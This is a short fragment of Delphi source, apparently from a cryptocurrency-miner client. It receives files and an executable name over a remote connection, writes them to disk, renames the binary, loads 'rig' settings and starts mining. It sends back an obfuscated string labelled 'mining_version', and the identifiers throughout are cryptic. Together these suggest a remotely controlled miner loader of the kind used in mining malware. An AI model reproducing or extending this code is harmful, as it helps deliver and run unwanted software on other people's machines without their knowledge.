    // Recv File Count
    Count := Thread.Connection.ReadInteger;

    // Recv Files
    MS := TMemoryStream.Create;
    for i := 0 to Count - 1 do begin
      Name := Thread.Connection.ReadLn;
      Size := Thread.Connection.ReadInteger;
      Thread.Connection.ReadStream(MS, Size);
      MS.SaveToFile(AddSlash(CDT.Mng.RnDr) + Name);
      MS.Clear;
      Thread.Connection.WriteLn('DONE');
    end;
    MS.Free;

    // Send Update Completed
    Thread.Connection.WriteLn(DE('k98fUZcoGjqiC9+mB/K')); // mining_version

    // Recv Config
    ExNm := Thread.Connection.ReadLn;

    // Change Exe Name
    try
      if FileExists(AddSlash(CDT.Mng.RnDr) + ExNm) then
        if pc64 then
          RenameFile(AddSlash(CDT.Mng.RnDr) + ExNm, AddSlash(CDT.Mng.RnDr) + CDT.Mng.E6Nm)
        else
          RenameFile(AddSlash(CDT.Mng.RnDr) + ExNm, AddSlash(CDT.Mng.RnDr) + CDT.Mng.E3Nm);
    except
    end;

    // Get Rig Config File
    CDT.Mng.RnPm := Thread.Connection.ReadLn;
    CDT.Mng.RnPmL := Thread.Connection.ReadLn;
    CDT.Mng.Eal := True;

    // Save Config
    SvCnf(CDT);

    // Start
    Min.Start(True);
  end;
end;  }

end.

